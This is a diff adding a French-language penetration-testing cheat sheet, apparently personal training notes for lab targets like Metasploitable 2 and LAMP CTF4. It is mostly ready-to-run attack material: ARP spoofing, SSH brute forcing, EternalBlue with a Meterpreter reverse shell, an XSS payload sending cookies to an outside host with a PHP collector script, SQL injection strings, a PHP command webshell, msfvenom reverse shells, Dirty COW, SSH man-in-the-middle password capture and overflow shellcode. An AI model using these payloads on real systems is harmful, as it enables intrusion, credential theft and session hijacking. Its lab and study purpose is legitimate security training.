@@ -1,0 +1,286 @@
+theHarvester :
+  theharvester -d <domaine> -b all
+
+Copier/coller dans un shell gnome : ctrl+shift+C/ctrl+shift+V
+
+https://haveibeenpwned.com/
+
+Recherche de sous-domaines (passif)
+subfinder -d <domain> -t 100 -v
+
+Recherche de sous-domaines par bruteforce (actif)
+fierce -dns <domain>
+# possibilité de lui donner une autre wordlist
+
+
+Suffixes DNS (Top Level Domain)
+https://github.com/rbsec/dnscan/blob/master/suffixes.txt
+
+
+Transfert de zone 
+ Réponse : dig -t axfr @<serveur dns> <domaine>
+        1) dig -t axfr @<serveur dns> <domaine> | grep -Ei "xp|2003|2k3"
+        2) dig -t axfr @<serveur dns> <domaine> | grep -i "tpe"
+
+https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/
+
+Nmap :
+nmap -sSVC -O -p- -v --open -oA nmap-output <target>
+
+Énumération SMTP
+https://github.com/pentestmonkey/smtp-user-enum
+
+
+apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED444FF07D8D0BF6
+
+ARP Cache Poisoning
+sur une machine :
+    arpspoof -t <ip victime> <ip gateway> -r
+sur le réseau :
+    arpspoof -i <interface (eth0)> <ip gateway>
+Bettercap :
+wget https://github.com/evilsocket/bettercap/archive/v1.6.2.zip
+unzip v1.6.2.zip
+apt install libpcap-dev
+cd bettercap-1.6.2/
+gem build bettercap.gemspec
+gem install bettercap*.gem
+cd bin
+./bettercap
+
+
+Mitigation :
+    sur la machine (linux) :
+        arp -s <ip gateway> <adresse mac>
+    sur le réseau (commutateur) :
+        Dynamic ARP Inspection
+        
+ 
+Bruteforce SSH :
+    patator ssh_login host=<IP Target> user=FILE0 password=FILE1 0=/usr/share/wordlists/metasploit/idrac_default_user.txt 1=/usr/share/wordlists/wfuzz/others/common_pass.txt -x ignore:mesg='Authentication failed.'
+    
+    
+Metasploit
+
+    exploitation MS17-010
+
+    msfconsole
+
+    search ms17
+
+    use exploit/windows/smb/ms17_010_eternalblue
+
+    set rhost <ip target>
+
+    set payload windows/x64/meterpreter/reverse_tcp
+
+    set lhost <ip attaquant>
+
+    run
+
+
+Wordlist Weakpass
+https://weakpass.com/download
+
+
+Comparatif génération hash
+https://gist.github.com/epixoip/a83d38f412b4737e99bbef804a270c40
+
+Correction Metasploitable 2
+https://metasploit.help.rapid7.com/v1.1/docs/metasploitable-2-exploitability-guide
+
+XSS - récupération du cookie
+<script>window.location="http://172.16.110.162:81/vuln.php?c="+document.cookie;</script>
+
+vuln.php :
+    <?php
+if(isset($_GET['c']) && is_string($_GET['c']) && !empty($_GET['c'])) {
+        $referer = $_SERVER['HTTP_REFERER'];
+        $date = date('d-m-Y \à H\hi');
+        $data = "From :   $referer\r\nDate :   $date\r\nCookie : ".htmlentities($_GET['c'])."\r\n------------------------------\r\n";
+        $handle = fopen('cookies.txt','a');
+        fwrite($handle, $data);
+        fclose($handle);
+}
+// et on envoie la cible où l'on veut pour détourner son attention ;)
+?>
+
+bypass filtre XSS :
+    <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+    
+encoder en base64 :
+    echo -n "<script>alert(1)</script>" | base64 
+    
+Afficher les tables
+' union select table_name, table_name from information_schema.tables-- -
+    
+Afficher les colonnes 
+' union select column_name, table_name from information_schema.columns-- -
+
+SQLMAP 
+sqlmap -u "172.16.110.135/index.html?page=blog&title=Blog&id=2*" 
+
+* : point d'injection
+
+sqlmap -r <request_file>
+
+
+LAMP CTF4
+
+Solutions / explications : 
+        Lors de l'accès à la page Contact, on remarque une erreur "contact.php doesn't exist" -> .php rajouté automatiquement
+        page=../../../../../etc/passwd%00 pour récupérer la liste des utilisateurs
+        dans la page Blog, parametre id vulnérable à l'injection SQL :
+        - '
+        - 5 - 2 (accès à la news 3)
+        - order by 10-- -
+        - order by 5-- -
+        dans robots.txt accès au dossier sql et accès à l'architecture de la bdd
+        - union select 1,2,3,4,5-- -
+        - union select 1,2,3,user_name,user_pass-- -
+        - ssh achen@ip -> mot de passe du md5
+        - élévations de privilèges :
+                - sudo su (utilisateur sudoer)
+                - exploit noyau
+
+---------------------------------
+Reconnaissance active :
+sudo nmap -sSVC -p- -A -T4 -vvv -n <IP_target> -oA <file_output>
+
+Crawling des réperoires :
+dirbuster
+- rentrer la target
+- selectionner  une wordlist dans /usr/share/wordlists/dirbuster/
+
+Scan de vulnérabilité WEB :
+nikto -h <target>
+
+Sqlmap :
+- dans Burp Suite, copier dans un fichier la requête contenant des paramètres (GET ou POST)
+- sqlmap -r <fichier contenant la requête> : permet d'identifier si un paramètre est vulnérable
+- sqlmap -r <fichier contenant la requête> --dump : si un paramètre est vulnérable, permet d'exploiter l'injection SQL et dumper le contenu des tables et colonnes de la base de données
+
+Webshell PHP :
+<?php  
+if(isset($_REQUEST['cmd'])){  
+    $cmd = ($_REQUEST["cmd"]);
+    system($cmd);
+    echo "</pre>$cmd<pre>";
+    die;
+}
+?>
+
+Webshell PHP avec Weevely :
+1. générer notre webshell
+  weevely generate <password> <fichier_webshell>
+2. uploader le webshell ou copier son contenu dans un formulaire d'upload
+3. accéder au webshell
+  weevely <url vers notre webshell> <password>
+  
+  
+Générer un payload reverse_tcp en PHP + se mettre en écoute
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<votre IP> LPORT=<votre port d'écoute> -o <fichier_php_reverse_tcp.php>
+msfconsole -x "use exploit/multi/handler;set payload php/meterpreter_reverse_tcp;set  LHOST=<votre IP>;set LPORT=<votre port d'écoute>;run"
+
+
+
+Exploit :
+msfconsole
+search <service> <version>
+use <exploit>
+options
+set RHOST <IP_target>
+set .........
+show payloads
+set payload <payload>
+set lhost <votre_IP>
+run
+
+Solutions Metasploitable2 : https://metasploit.help.rapid7.com/v1.1/docs/metasploitable-2-exploitability-guideroot
+
+Dirty Cow (Exploit Kernel) :
+  Télécharger dirty cow : https://www.exploit-db.com/exploits/40839/
+  Compiler dirty cow :
+ gcc -pthread <fichier dirtycow.c> -o dirtycow -lcrypt
+ En 32bits :
+gcc -m32 -pthread 40839.c -o dirty -lcrypt
+Uploader dirty cow sur la machine cible
+Exécuter dirtycow :
+./dirtycow <newpassword>
+Un utilisateur s'appelant firefart se crée avec comme mot de passe : la valeur mise dans <newpassword>
+
+Tester sa configuration SSL ou TLS :
+apt install testssl.sh
+testssl <url target>
+
+
+Man in the Middle (interception) SSH :
+git clone https://github.com/jtesta/ssh-mitm
+cd ssh-mitm
+# installation des dépendances
+bash install.sh
+# mise en place des règles iptables
+bash start.sh
+# man in the middle (ARP Cache Poisoning)
+arpspoof -i <interface réseau> <IP serveur SSH légitime>
+
+
+- attendre qu'une personne (victime) se connecte au serveur SSH (celle-ci va alors initier une connexion vers le serveur SSH illégitime avant d'être rediriger vers le serveur SSH légitime)
+- une fois que la victime s'est connectée au serveur SSH -> cat /var/log/auth.log (afin d'identifier le mot de passe en clair)
+- les sessions sont sauvegardés dans le fichier /home/ssh-mitm/sessions*.txt
+
+# restaurer les règles iptables
+bash stop.sh --force
+
+
+Bettercap (ARP Cache Poisoning)
+apt-get install bettercap
+bettercap -X --proxy -O bettercap.log
+
+Élévation de privilèges :
+- sudo su
+- exploit kernel
+- escape shell : https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells
+
+
+Dictionnaire de mots de passe :
+    https://weakpass.com/download
+
+
+Identifier les programmes SUID :
+    - find / -perm -4000 -user root 2>/dev/null 
+
+Identifier les programmes GUID :
+    find / -perm -2000 -user root 2>/dev/null 
+
+
+Installer PEDA :
+git clone https://github.com/longld/peda.git ~/peda && echo -e "source ~/peda/peda.py\nset disassembly-flavor intel\nset follow-fork-mode child" >> ~/.gdbinit
+
+Shellcode : 
+./chall_md5 $(python -c 'print "\x90" * 116 + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x2f\xf8\xff\xbf"') a
+
+NOP * 116 + SHELLCODE + EIP (qui vient taper sur une adresse contenant un NOP)
+
+
+
+
+Sites d'entrainements :
+  - https://www.zenk-security.com/
+  - https://www.root-me.org
+
+
+Veille :
+twitter -> #infosec
+Podcast sécu : https://www.nolimitsecu.fr/
+
+
+
+
+Manip Jo
+
+https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+https://www.cvedetails.com/vulnerability-search.php?f=1&vendor=&product=&cveid=CVE-2017-0144&msid=&bidno=&cweid=&cvssscoremin=&cvssscoremax=&psy=&psm=&pey=&pem=&usy=&usm=&uey=&uem=
+
+
+http://www.filedropper.com/newfile
